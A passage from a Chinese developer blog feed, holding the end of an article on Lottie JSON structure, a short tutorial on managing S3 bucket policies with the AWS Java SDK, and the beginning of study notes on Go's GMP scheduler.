<p><strong>重要说明</strong>：“高斯模糊 (<code>ty: 29</code>)”和“发光 (<code>ty: 27</code>)”等效果在公开的官方 Schema 文档中<strong>未有明确定义</strong>。它们可能由 Bodymovin 插件导出，但<strong>不一定被所有 Lottie 渲染器支持</strong>，在实际使用前必须进行充分的兼容性测试。</p>
</blockquote>
<h3 data-id="heading-48"><strong>表达式（Expression）：<code>x</code> 字段</strong></h3>
<p>表达式是 After Effects 中用于创建属性间动态关联的脚本语言。在 Lottie 中，表达式可以存储在属性的 <code>x</code> 字段中。</p>
<p>json</p>
<pre><code class="hljs language-css" lang="css">"<span class="hljs-selector-tag">p</span>": {
  "<span class="hljs-selector-tag">a</span>": <span class="hljs-number">1</span>,
  <span class="hljs-string">"k"</span>: [{"t":<span class="hljs-number">0</span>, <span class="hljs-string">"s"</span>:[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]}, {"t":<span class="hljs-number">30</span>, <span class="hljs-string">"s"</span>:[<span class="hljs-number">100</span>,<span class="hljs-number">100</span>]}],
  "x": <span class="hljs-string">"loopOut('cycle')"</span>  // 表达式：循环播放动画
}
</code></pre>
<p><strong>表达式的作用与局限性</strong>：</p>
<ul>
<li><strong>作用</strong>：可以创建循环 (<code>loopOut</code>)、随机 (<code>wiggle</code>)、数学关联等复杂动画逻辑，无需大量关键帧。</li>
<li><strong>局限性</strong>：<strong>平台支持极不完整</strong>。仅有少数最基础的表达式可能在部分平台上被识别，复杂的表达式通常会被忽略或导致动画错误。在需要跨平台稳定播放的动画中，应尽量避免使用表达式。</li>
</ul>
<h3 data-id="heading-49"><strong>混合模式（Blend Mode）：<code>bm</code> 字段</strong></h3>
<p>混合模式控制当前图层如何与下层图层进行颜色混合。在图层（根对象）或形状样式元素（如 <code>fl</code>, <code>st</code>）中通过 <code>bm</code> 字段定义。</p>
<p>json</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"bm"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span>  <span class="hljs-comment">// 叠加模式 (Overlay)</span>
</code></pre>
<p><strong>混合模式值速查表</strong> (根据官方 <code>/helpers/blendMode.json</code>)：</p>



























































<table><thead><tr><th>值</th><th>模式 (英文)</th><th>值</th><th>模式 (英文)</th></tr></thead><tbody><tr><td>0</td><td>Normal (正常)</td><td>8</td><td>Hard Light (强光)</td></tr><tr><td>1</td><td>Multiply (相乘)</td><td>9</td><td>Soft Light (柔光)</td></tr><tr><td>2</td><td>Screen (屏幕)</td><td>10</td><td>Difference (差值)</td></tr><tr><td>3</td><td>Overlay (叠加)</td><td>11</td><td>Exclusion (排除)</td></tr><tr><td>4</td><td>Darken (变暗)</td><td>12</td><td>Hue (色相)</td></tr><tr><td>5</td><td>Lighten (变亮)</td><td>13</td><td>Saturation (饱和度)</td></tr><tr><td>6</td><td>Color Dodge (颜色减淡)</td><td>14</td><td>Color (颜色)</td></tr><tr><td>7</td><td>Color Burn (颜色加深)</td><td>15</td><td>Luminosity (明度)</td></tr></tbody></table>
<p><strong>注意</strong>：混合模式在 SVG/HTML 渲染器中支持较好，在其他渲染器（如 Canvas）或某些移动端平台中可能需要降级处理或不被支持。</p>
<hr/>
<h2 data-id="heading-50"><strong>九、结语</strong></h2>
<p>本文系统性地解析了 Lottie JSON 的核心数据结构。以下是全文知识要点的回顾与总结：</p>
<h3 data-id="heading-51"><strong>核心数据结构总览</strong></h3>































































































<table><thead><tr><th>模块</th><th>关键对象/字段</th><th>核心作用与要点</th></tr></thead><tbody><tr><td><strong>顶层结构</strong></td><td><code>v</code>, <code>fr</code>, <code>ip</code>, <code>op</code>, <code>w</code>, <code>h</code></td><td>定义动画全局信息：版本、帧率、时间轴、画布尺寸。</td></tr><tr><td/><td><code>assets</code>, <code>layers</code>, <code>chars</code></td><td>三大数据支柱：可复用资源、图层序列、矢量字形。</td></tr><tr><td><strong>图层系统</strong></td><td><code>ty</code> (0-5)</td><td>标识六种图层类型：预合成、纯色、图像、空对象、形状、文本。</td></tr><tr><td/><td><code>ind</code>, <code>parent</code>, <code>ip</code>, <code>op</code>, <code>st</code></td><td>控制图层索引、父子关系、时间属性（入点、出点、起始时间）。</td></tr><tr><td/><td><code>ks</code></td><td><strong>变换属性容器</strong>，包含锚点(<code>a</code>)、位置(<code>p</code>)、缩放(<code>s</code>)、旋转(<code>r</code>)、透明度(<code>o</code>)等。</td></tr><tr><td><strong>动画系统</strong></td><td><code>ks</code> 下的 <code>a</code> 字段</td><td>属性动画开关：<code>0</code>为静态值，<code>1</code>为动画值（关键帧数组）。</td></tr><tr><td/><td>关键帧 <code>k</code> 数组</td><td>定义动画轨迹，包含时间(<code>t</code>)、值(<code>s</code>/<code>e</code>)、缓动(<code>i</code>/<code>o</code>)。</td></tr><tr><td><strong>形状系统</strong></td><td><code>shapes</code> 数组</td><td>形状图层的<strong>核心容器</strong>，元素按索引顺序渲染叠加。</td></tr><tr><td/><td><code>ty: el/rc/sr/sh</code></td><td>基础图形：椭圆、矩形、星形、自由路径（贝塞尔曲线定义）。</td></tr><tr><td/><td><code>ty: gr</code> (组)</td><td>使用 <code>it</code> 数组组织子元素，实现层级管理与统一变换。</td></tr><tr><td><strong>样式系统</strong></td><td><code>ty: fl</code> (填充)</td><td>定义形状填充色（纯色或渐变）。</td></tr><tr><td/><td><code>ty: st</code> (描边)</td><td>定义轮廓线样式，包括线宽(<code>w</code>)、端点(<code>lc</code>)、连接(<code>lj</code>)。</td></tr><tr><td><strong>修改器</strong></td><td><code>ty: tm</code> (Trim)</td><td>路径裁剪，通过动画起点(<code>s</code>)、终点(<code>e</code>)、偏移(<code>o</code>)实现绘制效果。</td></tr><tr><td/><td><code>ty: rp</code> (Repeater)</td><td>图形重复器，通过副本数(<code>c</code>)和增量变换(<code>tr</code>)创建阵列。</td></tr><tr><td><strong>高级特性</strong></td><td><code>masksProperties</code></td><td>蒙版数组，通过路径(<code>pt</code>)和模式(<code>mode</code>)控制图层显示区域。</td></tr><tr><td/><td><code>ef</code> (效果), <code>bm</code> (混合模式)</td><td>实现滤镜与图层混合，<strong>需注意平台支持度</strong>。</td></tr><tr><td/><td><code>x</code> (表达式)</td><td>支持简单表达式驱动属性，<strong>跨平台支持有限</strong>。</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-52"><strong>十、写在最后：笔者的思考</strong>💡</h2>
<p>在整理 Lottie 的技术细节时，我反复思考一个核心问题：<strong>我们看到的这套 JSON 结构，到底是由什么决定的？</strong></p>
<p>最直接的答案是“为了在网页上播放”。但这只是目的，并未解释其形态。我的思路分两步推进：第一，是 Web 的渲染能力（如 Canvas）限制了它的设计；第二，是否有更底层的蓝本在主导结构。</p>
<p>通过逐项对比，我找到了更关键的依据。<strong>Lottie JSON 的结构，本质上是对 After Effects 内部动画数据模型的直接翻译。</strong>  例如，JSON 中的 <code>ks</code> 对象精确对应了 AE 图层的“变换”属性组，<code>shapes</code> 数组则完全复现了 AE 形状层的堆叠逻辑。设计者的首要任务，是为 AE 的动画状态提供一个<strong>无损且精确的数据描述格式</strong>。</p>
<p>那么，Web 技术（如 Canvas/SVG）的作用是什么？我认为它主要扮演了  <strong>“支持度评估”与“性能优化”的角色</strong>。它并未改变数据描述的根本方式，而是基于实现难度与性能成本，划定了哪些 AE 高级功能可以（或不可以）被包含在这个格式中。例如，一些复杂的实时滤镜可能因性能考量而被排除。</p>
<p>这自然引向更深一层：<strong>AE 自身的这套强大模型又是如何建立的？</strong>  它并非凭空创造，而是对更早行业的数字化融合。其“合成”与“图层”概念源自<strong>电影工业</strong>的胶片叠加流程；“关键帧”动画继承自<strong>传统手绘动画</strong>的生产方式；而所有视觉变换的根基，则是<strong>计算机图形学</strong>提供的数学工具（如坐标变换、贝塞尔曲线）。</p>
<p>因此，学习 Lottie 最有效的方法，并非孤立记忆 JSON 字段，而是<strong>理解它作为“AE 模型的数据接口”这一定位</strong>。掌握 AE 的核心概念，就能理解 Lottie 绝大部分的设计逻辑。这揭示了一种高效的学习路径：当面对一个出色的“技术转译层”时，直接研究它所转译的<strong>源系统</strong>，往往是理解其设计最快的方式。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[使用AWS SDK实现S3桶策略配置]]></title>    <link>https://juejin.cn/post/7594310266410696704</link>    <guid>https://juejin.cn/post/7594310266410696704</guid>    <pubDate>2026-01-12T14:46:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594310266410696704" data-draft-id="7593362940071313460" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="使用AWS SDK实现S3桶策略配置"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-12T14:46:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小瓦码J码"/> <meta itemprop="url" content="https://juejin.cn/user/1528766364915136"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            使用AWS SDK实现S3桶策略配置
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1528766364915136/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小瓦码J码
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T14:46:10.000Z" title="Mon Jan 12 2026 14:46:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>S3是广泛使用对象存储服务。</p>
<p>当使用了S3或者S3兼容服务作对象存储服务时，免不了要进行设置桶策略。有很多种方法可以设置桶策略：</p>
<ul>
<li>使用web管理页面</li>
<li>使用S3 Browser客户端程序</li>
<li>AWS CLI 命令行客户端</li>
</ul>
<p>这些方法虽然可行，但是增加了学习和记忆的成本。作为一个懒人，灵机一动想到了一个偷懒的办法，既然已经在程序中引入是AWS SDK了，并且代码库中已经写好了<code>helper</code>类和连接配置，何不好好利用它呢。</p>
<p>因为桶策略是使用json定义的，这是跨语言SDK的通用要求。所以只要定义好桶策略的json，就可以交给SDK执行了。</p>
<p>举例：比如要设置公开策略，则json格式如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"Version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2012-10-17"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"Statement"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"Sid"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"PublicReadForBucketObjects"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"Effect"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Allow"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"Principal"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"*"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"Action"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"s3:GetObject"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"Resource"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"arn:aws:s3:::%s/*"</span>
        <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>以上json，既可以作为参数传递给SDK，又可以直接定义在代码中直接使用，或者定义一组策略方便直接使用。</p>
<h2 data-id="heading-0">设置桶策略</h2>
<p>调用putBucketPolicy方法实现，桶策略设置。在桶策略的json中<code>%s</code>，是用来设置桶名的占位符，方便动态替换。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBucketPolicy</span><span class="hljs-params">(String bucketName, String bucketPolicyJson)</span> {

    <span class="hljs-type">PutBucketPolicyRequest</span> <span class="hljs-variable">policyRequest</span> <span class="hljs-operator">=</span> PutBucketPolicyRequest.builder()
            .bucket(bucketName)
            .policy(String.format(bucketPolicyJson, bucketName))
            .build();
    
    s3Client.putBucketPolicy(policyRequest);
}
</code></pre>
<h2 data-id="heading-1">查询桶策略</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getBucketPolicy</span><span class="hljs-params">(String bucketName)</span> {

    <span class="hljs-type">GetBucketPolicyRequest</span> <span class="hljs-variable">policyRequest</span> <span class="hljs-operator">=</span> GetBucketPolicyRequest.builder()
            .bucket(bucketName)
            .build();

    <span class="hljs-type">GetBucketPolicyResponse</span> <span class="hljs-variable">policyResponse</span> <span class="hljs-operator">=</span> s3Client.getBucketPolicy(policyRequest);

    <span class="hljs-type">String</span> <span class="hljs-variable">policyJson</span> <span class="hljs-operator">=</span> policyResponse.policy();

    <span class="hljs-keyword">return</span> policyJson;
}
</code></pre>
<h2 data-id="heading-2">删除桶策略</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteBucketPolicy</span><span class="hljs-params">(String bucketName)</span> {
    <span class="hljs-type">DeleteBucketPolicyRequest</span> <span class="hljs-variable">policyRequest</span> <span class="hljs-operator">=</span> DeleteBucketPolicyRequest.builder()
            .bucket(bucketName)
            .build();

    s3Client.deleteBucketPolicy(policyRequest);
}
</code></pre>
<h2 data-id="heading-3">总结</h2>
<p>通过以上API的调用，可以很方便的进行桶策略的管理。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GMP 调度器深度学习笔记]]></title>    <link>https://juejin.cn/post/7594350054090686506</link>    <guid>https://juejin.cn/post/7594350054090686506</guid>    <pubDate>2026-01-12T14:45:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594350054090686506" data-draft-id="7594485030232997929" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GMP 调度器深度学习笔记"/> <meta itemprop="keywords" content="后端,Go"/> <meta itemprop="datePublished" content="2026-01-12T14:45:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="炎昇"/> <meta itemprop="url" content="https://juejin.cn/user/534829144487531"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GMP 调度器深度学习笔记
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/534829144487531/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    炎昇
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T14:45:38.000Z" title="Mon Jan 12 2026 14:45:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、核心概念（理论构建）</h2>
<h3 data-id="heading-1">1. GMP 三大核心组件</h3>
<h4 data-id="heading-2">G (Goroutine)</h4>
<ul>
<li><strong>定义</strong>：代表一个 Goroutine，包含了函数指针、栈信息、状态等</li>
<li><strong>重要状态</strong>：
<ul>
<li><code>_Gidle</code>: 刚刚分配，还未初始化</li>
<li><code>_Grunnable</code>: 在运行队列中，等待被执行</li>
<li><code>_Grunning</code>: 正在执行，已经和 M 绑定</li>
<li><code>_Gsyscall</code>: 正在执行系统调用</li>
<li><code>_Gwaiting</code>: 被阻塞（等待 channel、锁等）</li>
<li><code>_Gdead</code>: 刚刚退出或正在被初始化</li>
</ul>
</li>
</ul>
<h4 data-id="heading-3">M (Machine)</h4>
<ul>
<li><strong>定义</strong>：操作系统线程的抽象，真正执行 Goroutine 的实体</li>
<li><strong>特点</strong>：
<ul>
<li>M 必须持有 P 才能执行 G</li>
<li>数量可以动态增长（上限默认 10000）</li>
<li>存在特殊的 M0 和系统监控线程 sysmon</li>
</ul>
</li>
</ul>
<h4 data-id="heading-4">P (Processor)</h4>
<ul>
<li><strong>定义</strong>：逻辑处理器，代表执行 Go 代码所需的资源</li>
<li><strong>核心功能</strong>：
<ul>
<li>维护本地可运行队列 <code>runq</code>（环形队列，最多 256 个 G）</li>
<li>持有 mcache（用于内存分配）</li>
<li>GOMAXPROCS 决定 P 的数量（默认等于 CPU 核心数）</li>
</ul>
</li>
</ul>
<h3 data-id="heading-5">2. GMP 模型的演进</h3>
<pre><code class="hljs language-less" lang="less">旧模型（<span class="hljs-selector-tag">Go</span> <span class="hljs-number">1.0</span>）: <span class="hljs-selector-tag">G</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">M</span> 直接绑定
问题：全局队列竞争激烈，锁开销大

新模型（<span class="hljs-selector-tag">Go</span> <span class="hljs-number">1.1</span>+）: <span class="hljs-selector-tag">G</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">P</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">M</span> 三层结构
优势：
  <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">P</span> 的本地队列减少锁竞争
  <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Work</span> <span class="hljs-selector-tag">Stealing</span> 提高 <span class="hljs-selector-tag">CPU</span> 利用率
  <span class="hljs-selector-tag">-</span> 系统调用时，<span class="hljs-selector-tag">M</span> 和 <span class="hljs-selector-tag">P</span> 解绑，<span class="hljs-selector-tag">P</span> 可以继续被其他 <span class="hljs-selector-tag">M</span> 使用
</code></pre>
<h3 data-id="heading-6">3. 调度器的关键机制</h3>
<h4 data-id="heading-7">调度时机</h4>
<ol>
<li><strong>主动调度</strong>：Goroutine 调用 <code>runtime.Gosched()</code> 主动让出 CPU</li>
<li><strong>被动调度</strong>：Channel 阻塞、锁等待、网络 IO 等</li>
<li><strong>抢占式调度</strong>：
<ul>
